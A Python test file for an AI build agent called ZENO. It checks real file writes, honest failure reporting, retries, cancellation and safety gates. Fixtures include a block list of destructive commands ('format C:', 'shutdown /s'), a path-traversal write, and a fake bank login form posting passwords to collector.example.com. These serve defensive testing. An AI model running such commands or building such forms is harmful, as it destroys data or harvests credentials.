"""Proof that ZENO executes instead of describing.

Every test here asserts on something observable -- a file on disk, a
process exit code, an HTTP response, a recorded event -- rather than on a
string ZENO produced about its own work. That distinction is the entire
point of the change these tests cover: the previous failure mode was
confident narration with nothing behind it.

Run directly: `.venv/Scripts/python.exe tests/test_build_execution.py`
"""

from __future__ import annotations

import atexit
import os
import shutil
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

SITE = [
    {"path": "index.html", "content": (
        '<!doctype html><html><head><meta charset="utf-8"><title>Test</title>'
        '<link rel="stylesheet" href="styles.css"></head><body>'
        '<h1 id="title">Demo</h1><script src="script.js"></script></body></html>')},
    {"path": "styles.css", "content": "body{background:#0b1220;color:#e6eeff}"},
    {"path": "script.js", "content": 'document.getElementById("title").textContent = "Ready";'},
]

_TEMP_ROOTS: list[str] = []


def _cleanup_temp_roots() -> None:
    """Keep this standalone runner from leaving `zeno-test-*` trees behind."""
    for raw in _TEMP_ROOTS:
        shutil.rmtree(raw, ignore_errors=True)


atexit.register(_cleanup_temp_roots)


def _build(**kwargs):
    from reyes_agent.tools.build import build_project

    kwargs.setdefault("preview", False)
    kwargs.setdefault("open_folder", False)
    return build_project(**kwargs)


def _tmp() -> str:
    root = tempfile.mkdtemp(prefix="zeno-test-")
    _TEMP_ROOTS.append(root)
    return root


# --- a request becomes a real task ---------------------------------------

def test_build_request_creates_a_real_task_with_a_finite_plan() -> None:
    from reyes_agent import task_engine

    root = _tmp()
    _build(task="Test site", folder_name="PlanDemo", destination=root, files=SITE)
    task = [t for t in task_engine.active() if t["title"] == "Test site"][-1]
    assert task["task_id"] and task["plan_id"], "task_id and plan_id must exist"
    assert task["planned_total"] >= len(SITE) + 2, "the plan must be declared up front"
    assert task["progress_percent"] == 100, task["progress_percent"]
    assert task["current_status"] == task_engine.COMPLETED, task["error_details"]
    # Every state the brief asked for is a real member of the lifecycle.
    for state in ("PLANNING", "WAITING_FOR_APPROVAL", "RUNNING", "VERIFYING",
                  "RETRYING", "COMPLETED", "FAILED", "CANCELLED"):
        assert state in task_engine.ALL_STATES


def test_files_are_genuinely_written_and_verified_on_disk() -> None:
    root = _tmp()
    result = _build(task="Real files", folder_name="FileDemo", destination=root, files=SITE)
    folder = Path(root) / "FileDemo"
    assert folder.is_dir(), "the project folder must really exist"
    for entry in SITE:
        target = folder / entry["path"]
        assert target.is_file(), f"{entry['path']} was reported but is not on disk"
        assert target.read_text(encoding="utf-8") == entry["content"], "contents must match exactly"
    assert "BUILD COMPLETED" in result
    # Atomic writes must not leave their temporary files behind.
    assert not list(folder.glob(".zeno-*")), "temp files leaked into the project"


def test_desktop_is_resolved_through_the_known_folder_api() -> None:
    from reyes_agent import project_activity
    from reyes_agent.executors import desktop

    resolved = desktop.desktop_path()
    assert resolved.is_dir(), f"{resolved} is not a real folder"
    assert resolved.name.lower() == "desktop" or "desktop" in str(resolved).lower()
    # The older write path and the build pipeline must agree, or a file
    # lands somewhere the owner cannot see.
    assert project_activity.desktop_path() == resolved
    assert desktop.resolve_destination("Desktop") == resolved
    assert desktop.resolve_destination("my desktop") == resolved
    described = desktop.describe()
    assert described["exists"] == "true"
    # OneDrive redirection must be reported, not assumed away.
    assert described["redirected"] in {"true", "false"}
    try:
        desktop.resolve_destination("somewhere-random")
    except ValueError as exc:
        assert "full folder path" in str(exc)
    else:  # pragma: no cover
        raise AssertionError("a non-existent named location must be refused")


def test_correct_executor_is_selected_for_each_kind_of_work() -> None:
    from reyes_agent.executors import terminal

    # Project tooling runs here; anything else is referred to the gate.
    for command in ("npm install", "npm run build", "node index.js", "git init", "npx vite"):
        allowed, reason = terminal.classify(command)
        assert allowed, f"{command} should be runnable: {reason}"
    for command in ("format C:", "shutdown /s", "reg add HKLM\\x", "npm publish",
                    "git push origin main", "npm i -g typescript", "notepad.exe"):
        allowed, reason = terminal.classify(command)
        assert not allowed, f"{command} must NOT run automatically"
        assert reason, "a refusal must explain itself"


# --- honesty about failure -----------------------------------------------

def test_failed_command_is_never_reported_as_successful() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import terminal

    root = Path(_tmp())
    (root / "boom.js").write_text("process.exit(3);", encoding="utf-8")
    task = task_engine.create("failing command", plan=["Running node boom.js"])
    result = terminal.run(task.id, "node boom.js", root)
    assert result.ok is False, "a non-zero exit must not be ok"
    assert result.exit_code == 3, result.exit_code
    assert "exit" in result.summary().lower() and "FAILED" in result.summary()


def test_broken_project_cannot_report_completed() -> None:
    from reyes_agent import task_engine

    root = _tmp()
    result = _build(task="Broken", folder_name="BrokenDemo", destination=root, files=[
        {"path": "index.html", "content": '<html><body><script src="app.js"></script></body></html>'},
        {"path": "app.js", "content": "function broken( { "},
    ])
    assert "BUILD DID NOT FULLY SUCCEED" in result, result
    task = [t for t in task_engine.active() if t["title"] == "Broken"][-1]
    assert task["current_status"] == task_engine.FAILED
    assert any(not c["ok"] for c in task["verification"]), "the real defect must be recorded"
    # And the files it DID write still exist -- a failure is not a rollback.
    assert (Path(root) / "BrokenDemo" / "app.js").is_file()


def test_completion_is_refused_without_verification_evidence() -> None:
    from reyes_agent import task_engine

    task = task_engine.create("unverified", plan=["Creating index.html"])
    task_engine.begin_step(task.id, "Creating index.html")
    task_engine.complete_step(task.id, "Creating index.html")
    snapshot = task_engine.complete(task.id)
    assert snapshot["current_status"] == task_engine.FAILED
    assert "no verification evidence" in snapshot["error_details"]


def test_unsafe_commands_are_refused_and_named() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import terminal

    root = Path(_tmp())
    task = task_engine.create("unsafe", plan=["Running"])
    result = terminal.run(task.id, "npm publish", root)
    assert result.blocked and not result.ok
    assert "approval" in result.reason
    assert result.exit_code is None, "a refused command never ran, so it has no exit code"


def test_build_never_generates_real_dotenv_or_private_key_files() -> None:
    root = _tmp()
    result = _build(task="Secret output", folder_name="SecretDemo", destination=root, files=[
        {"path": "index.html", "content": "<title>Safe</title>"},
        {"path": ".env", "content": "API_KEY=not-a-real-key"},
        {"path": "server.pem", "content": "private material"},
        {"path": ".env.example", "content": "API_KEY=replace-me"},
    ])
    project = Path(root) / "SecretDemo"
    assert "BUILD DID NOT FULLY SUCCEED" in result, result
    assert not (project / ".env").exists() and not (project / "server.pem").exists()
    assert (project / ".env.example").read_text(encoding="utf-8") == "API_KEY=replace-me"


def test_website_repair_is_bounded_categorised_and_rolls_back_if_worse() -> None:
    from reyes_agent.executors import coding

    root = Path(_tmp())
    page = root / "index.html"
    page.write_text('<link rel="stylesheet" href="css/styles.css">', encoding="utf-8")
    (root / "styles.css").write_text('body{color:green}', encoding="utf-8")
    repaired = coding.repair_project(root)
    assert repaired.attempts == 1 and repaired.applied
    assert repaired.categories == {} and 'href="styles.css"' in page.read_text(encoding="utf-8")

    page.write_text('<link rel="stylesheet" href="css/styles.css">', encoding="utf-8")
    original_autofix = coding.autofix
    def make_worse(target, _issues):
        (Path(target) / "index.html").write_text('<link href="also-missing.css"><script src="still-missing.js"></script>', encoding="utf-8")
        return ["test corruption"]
    try:
        coding.autofix = make_worse
        rolled = coding.repair_project(root)
    finally:
        coding.autofix = original_autofix
    assert rolled.rolled_back and rolled.attempts == 1
    assert 'href="css/styles.css"' in page.read_text(encoding="utf-8")


# --- duplicates, retries, cancellation -----------------------------------

def test_duplicate_command_does_not_run_twice() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import terminal

    root = Path(_tmp())
    (root / "once.js").write_text('require("fs").appendFileSync("count.txt","x");', encoding="utf-8")
    task = task_engine.create("dedupe", plan=["Running node once.js"])
    first = terminal.run(task.id, "node once.js", root)
    second = terminal.run(task.id, "node once.js", root)
    assert first.ok and second.ok
    assert second.skipped_duplicate, "the identical command must not run again"
    assert (root / "count.txt").read_text(encoding="utf-8") == "x", "the side effect happened once"


def test_repeated_build_request_continues_one_task() -> None:
    from reyes_agent import task_engine
    from reyes_agent.tools.build import build_add_files

    root = _tmp()
    before = len(task_engine.active())
    started = _build(task="Two part", folder_name="TwoPart", destination=root,
                     files=SITE[:1], finish=False)
    task_id = started.split("task_id=")[1].split()[0]
    build_add_files(task_id=task_id, files=SITE[1:], preview=False)
    after = [t for t in task_engine.active() if t["title"] == "Two part"]
    assert len(after) == 1, "a continuation must not open a second task"
    assert len(task_engine.active()) == before + 1
    folder = Path(root) / "TwoPart"
    assert sorted(p.name for p in folder.iterdir()) == ["index.html", "script.js", "styles.css"]


def test_failed_step_retries_only_itself() -> None:
    from reyes_agent import task_engine

    task = task_engine.create("retry", plan=["Step A", "Step B"])
    task_engine.begin_step(task.id, "Step A")
    task_engine.complete_step(task.id, "Step A")
    task_engine.begin_step(task.id, "Step B")
    assert task_engine.fail_step(task.id, "Step B", "network blip") is True
    assert task_engine.snapshot(task)["current_status"] == task_engine.RETRYING
    assert task_engine.snapshot(task)["retrying"], "retry status must be visible"
    task_engine.begin_step(task.id, "Step B")
    task_engine.complete_step(task.id, "Step B")
    steps = task_engine.snapshot(task)["steps"]
    assert [s["state"] for s in steps] == ["completed", "completed"]
    assert steps[0]["attempts"] == 1, "the passing step must not be re-run"
    assert steps[1]["attempts"] == 2, "only the failed step retried"

    # And the budget is finite -- a step that keeps failing stops rather
    # than grinding, so the real blocker reaches the owner.
    budget = task_engine.create("budget", plan=["Flaky step"])
    for attempt in range(task_engine.MAX_STEP_ATTEMPTS - 1):
        task_engine.begin_step(budget.id, "Flaky step")
        assert task_engine.fail_step(budget.id, "Flaky step", "still failing") is True, attempt
    task_engine.begin_step(budget.id, "Flaky step")
    assert task_engine.fail_step(budget.id, "Flaky step", "gave up") is False


def test_cancelling_a_task_stops_its_processes() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import terminal

    root = Path(_tmp())
    (root / "wait.js").write_text("setTimeout(function(){}, 120000);", encoding="utf-8")
    task = task_engine.create("cancel", plan=["Running node wait.js"])
    background, error = terminal.spawn(task.id, "node wait.js", root)
    assert background is not None, error
    assert background.alive(), "the process should be running before cancel"
    snapshot = task_engine.cancel(task.id)
    deadline = time.time() + 15
    while background.alive() and time.time() < deadline:
        time.sleep(0.1)
    assert not background.alive(), "cancel must actually kill the process"
    assert snapshot["current_status"] == task_engine.CANCELLED
    assert snapshot["cancellable"] is False


# --- preview, verification, reporting ------------------------------------

def test_preview_server_serves_and_verifies_the_real_page() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import preview

    root = Path(_tmp())
    for entry in SITE:
        (root / entry["path"]).write_text(entry["content"], encoding="utf-8")
    task = task_engine.create("preview", plan=["Starting development server"])
    running, error = preview.start(task.id, root)
    try:
        assert running is not None, error
        registered = preview.for_project(root)
        assert registered and registered["url"] == running.url and registered["port"]
        assert task.id in registered["task_ids"]
        ok, detail = preview.probe(running.url)
        assert ok, detail
        assert "HTTP 200" in detail
        checks = preview.check_page(running.url, root)
        assert all(c["ok"] for c in checks), [c for c in checks if not c["ok"]]
        assert any("styles.css" in c["check"] for c in checks), "the stylesheet must be fetched, not assumed"
        # A missing asset is caught over HTTP, not guessed at.
        missing_ok, missing_detail = preview.probe(running.url + "nope.css")
        assert not missing_ok and "404" in missing_detail
    finally:
        task_engine.cancel(task.id)


def test_browser_preview_opens_once() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import application, preview

    opened: list[str] = []
    real = preview.webbrowser.open
    preview.webbrowser.open = lambda url, new=0: (opened.append(url), True)[1]
    application.reset_dedupe()
    try:
        task = task_engine.create("open once", plan=["Opening browser preview"])
        running = preview.Preview(url="http://127.0.0.1:1/", mode="static", root=".")
        assert preview.open_in_browser(task.id, running)[0] is True
        assert preview.open_in_browser(task.id, running)[0] is True
        assert len(opened) == 1, "a second request must not open a second tab"
        # The Application Executor de-duplicates independently.
        assert application.open_url("http://127.0.0.1:2/")[0] is True
        assert application.open_url("http://127.0.0.1:2/")[0] is True
        assert len(opened) == 2
    finally:
        preview.webbrowser.open = real
        application.reset_dedupe()


def test_final_verification_runs_and_reports_the_real_path() -> None:
    from reyes_agent import task_engine

    root = _tmp()
    result = _build(task="Verified", folder_name="VerifyDemo", destination=root, files=SITE)
    expected = str((Path(root) / "VerifyDemo").resolve())
    assert expected in result, f"the report must contain the real path\n{result}"
    task = [t for t in task_engine.active() if t["title"] == "Verified"][-1]
    assert Path(task["output_path"]).samefile(expected)
    names = {c["check"] for c in task["verification"]}
    assert "Project folder exists" in names
    assert "Files were written" in names
    assert "Code has no blocking defects" in names
    assert all(c["ok"] for c in task["verification"])
    assert task["verified"] is True


def test_progress_events_match_real_actions() -> None:
    """Every step the panel shows must trace to an executor observation."""
    from reyes_agent import event_bus, task_engine

    captured: list[dict] = []
    real_publish = event_bus.publish

    def spy(event_type, payload=None, source="", correlation_id=""):
        if event_type == "build.task":
            captured.append({"action": (payload or {}).get("action", ""),
                             "task": (payload or {}).get("task", {})})
        return real_publish(event_type, payload, source, correlation_id)

    event_bus.publish = spy
    root = _tmp()
    try:
        _build(task="Evented", folder_name="EventDemo", destination=root, files=SITE)
    finally:
        event_bus.publish = real_publish

    actions = [c["action"] for c in captured]
    assert "created" in actions and "planned" in actions
    assert actions.count("step_started") >= len(SITE) + 2
    assert actions.count("step_completed") >= len(SITE) + 2
    assert "verification" in actions and "completed" in actions
    # A completed file step is never emitted before that file exists on disk.
    folder = Path(root) / "EventDemo"
    written = {entry["path"] for entry in SITE}
    checked = 0
    for entry in captured:
        if entry["action"] != "step_completed":
            continue
        for step in entry["task"]["steps"]:
            name = step["label"].removeprefix("Creating ")
            if step["state"] == "completed" and name in written:
                assert (folder / name).is_file(), f"{name} reported complete before it existed"
                checked += 1
    assert checked >= len(SITE), "every file step must have been checked"
    # Progress only ever moves forward, and never past 100.
    percents = [c["task"]["progress_percent"] for c in captured if c["task"].get("progress_percent") is not None]
    assert percents == sorted(percents) and max(percents) == 100
    _ = task_engine


# --- durability and stability --------------------------------------------

def test_completed_files_survive_a_zeno_restart() -> None:
    from reyes_agent import task_engine

    root = _tmp()
    _build(task="Durable", folder_name="DurableDemo", destination=root, files=SITE)
    folder = Path(root) / "DurableDemo"
    # Simulate a ZENO restart: the live task projection is process memory.
    with task_engine._lock:
        task_engine._tasks.clear()
    assert task_engine.active() == []
    assert folder.is_dir(), "the project must outlive the process that made it"
    for entry in SITE:
        assert (folder / entry["path"]).read_text(encoding="utf-8") == entry["content"]


def test_long_task_state_stays_bounded() -> None:
    """A long build cannot grow ZENO's memory without limit."""
    from reyes_agent import task_engine

    task = task_engine.create("long", plan=["Step"])
    real_publish = task_engine._emit
    task_engine._emit = lambda *_args: None
    try:
        for index in range(3000):
            task_engine.record_terminal(task.id, f"line {index}")
            task_engine.record_warning(task.id, f"warning {index}")
            task_engine.record_file(task.id, f"file-{index}.txt")
    finally:
        task_engine._emit = real_publish
    assert len(task.terminal) <= 400
    assert len(task.warnings) <= 40
    assert len(task.files) <= 200
    assert len(task_engine._tasks) <= 12, "old tasks must be evicted"


def test_atomic_write_verifies_and_refuses_escapes() -> None:
    from reyes_agent.executors import filesystem

    root = Path(_tmp())
    ok = filesystem.write_file(root, "sub/dir/file.txt", "content here")
    assert ok.ok and ok.verified and ok.bytes_written == 12
    assert (root / "sub" / "dir" / "file.txt").read_text(encoding="utf-8") == "content here"
    escape = filesystem.write_file(root, "../escaped.txt", "nope")
    assert not escape.ok and "escapes the project folder" in escape.message
    assert not (root.parent / "escaped.txt").exists()
    good, detail = filesystem.verify_file(root / "sub" / "dir" / "file.txt", expected_bytes=12)
    assert good, detail
    bad, detail = filesystem.verify_file(root / "sub" / "dir" / "file.txt", expected_bytes=99)
    assert not bad and "expected 99" in detail


# --- safety --------------------------------------------------------------

def test_banking_demo_must_not_collect_real_credentials() -> None:
    from reyes_agent import task_engine
    from reyes_agent.executors import coding

    root = _tmp()
    result = _build(task="Unsafe bank", folder_name="UnsafeBank", destination=root, files=[
        {"path": "index.html", "content": (
            '<html><body><h1>Bank login</h1>'
            '<form action="https://collector.example.com/login" method="post">'
            '<input type="password" name="pw"><button>Sign in</button></form></body></html>')},
    ])
    assert "BUILD DID NOT FULLY SUCCEED" in result, result
    task = [t for t in task_engine.active() if t["title"] == "Unsafe bank"][-1]
    assert task["current_status"] == task_engine.FAILED
    issues = coding.demo_safety_issues(Path(root) / "UnsafeBank")
    assert any(i.kind == "unsafe_form" for i in issues)

    # A clearly-labelled local demo is fine.
    safe_root = _tmp()
    safe = _build(task="Safe bank", folder_name="SafeBank", destination=safe_root, files=[
        {"path": "index.html", "content": (
            '<html><body><p>Demo only - sample data, no real credentials.</p>'
            '<form><input type="password" name="pw"><button>Sign in</button></form></body></html>')},
    ])
    assert "BUILD COMPLETED" in safe, safe


def test_missing_dependencies_are_named_not_faked() -> None:
    from reyes_agent.executors import coding, terminal

    root = Path(_tmp())
    (root / "package.json").write_text('{"name":"x","scripts":{"dev":"vite"}}', encoding="utf-8")
    real = terminal.tool_available
    terminal.tool_available = lambda program: False
    try:
        missing = coding.missing_dependencies(root)
    finally:
        terminal.tool_available = real
    assert missing and "Node.js" in missing[0]


# --- the panel is wired to real events -----------------------------------

def test_activity_panel_and_endpoints_are_event_driven() -> None:
    source = (ROOT / "reyes_agent" / "static" / "activity_view.js").read_text(encoding="utf-8")
    web = (ROOT / "reyes_agent" / "web.py").read_text(encoding="utf-8")
    index = (ROOT / "reyes_agent" / "static" / "index.html").read_text(encoding="utf-8")

    assert "build.task" in source and "project.activity" in source
    assert "setInterval" not in source, "no simulated progress loop"
    assert "progress_percent" in source and "no estimated percentage" in source
    for control in ("Open Folder", "Open Website", "Cancel Task"):
        assert control in source, f"the panel must offer {control}"
    for field in ("current_step", "pending_steps", "current_command", "current_file",
                  "terminal", "retrying", "output_path", "verification", "warnings", "errors"):
        assert field in source, f"the panel must render {field}"
    for route in ("/api/build/tasks", "/api/build/cancel", "/api/build/open-folder",
                  "/api/build/open-preview"):
        assert f'"{route}"' in web, f"{route} must exist"
        assert route in source, f"the panel must call {route}"
    assert "'build.task'" in index, "the dashboard must forward build events to the panel"


def test_build_tools_are_registered_and_discoverable() -> None:
    from reyes_agent.tools import TOOLS, group_of, tool_definitions

    assert "build_project" in TOOLS
    assert group_of("build_project") == "core", "the entry point must not need discovering"
    core = {t["name"] for t in tool_definitions()}
    assert "build_project" in core
    for name in ("build_add_files", "build_status", "cancel_build", "build_environment"):
        assert name in TOOLS and group_of(name) == "build"
    widened = {t["name"] for t in tool_definitions(groups={"build"})}
    assert {"build_add_files", "cancel_build"} <= widened
    # The agent core widens automatically when a build starts, so the
    # follow-up tools cost nothing until they are needed.
    agent = (ROOT / "reyes_agent" / "agent.py").read_text(encoding="utf-8")
    assert 'tc.name == "build_project"' in agent and 'widen = "build"' in agent


def test_system_prompt_routes_actions_to_execution() -> None:
    from reyes_agent import config

    prompt = config.SYSTEM_PROMPT
    assert "Questions vs. actions" in prompt
    assert "build_project" in prompt
    for verb in ("create", "build", "save", "open", "edit", "move", "rename",
                 "install", "run", "preview", "test"):
        assert verb in prompt.lower()
    assert "creates nothing" in prompt.lower()
    assert "fictional" in prompt.lower() and "no real credentials" in prompt.lower()


def _run_all() -> int:
    tests = [value for name, value in sorted(globals().items())
             if name.startswith("test_") and callable(value)]
    failed = 0
    for test in tests:
        started = time.time()
        try:
            test()
            print(f"PASS {test.__name__} ({time.time() - started:.1f}s)")
        except Exception as exc:  # noqa: BLE001
            failed += 1
            print(f"FAIL {test.__name__}: {type(exc).__name__}: {exc}")
    print(f"{len(tests) - failed} passed, {failed} failed")
    return 1 if failed else 0


if __name__ == "__main__":
    os.environ.setdefault("ZENO_TEST", "1")
    raise SystemExit(_run_all())
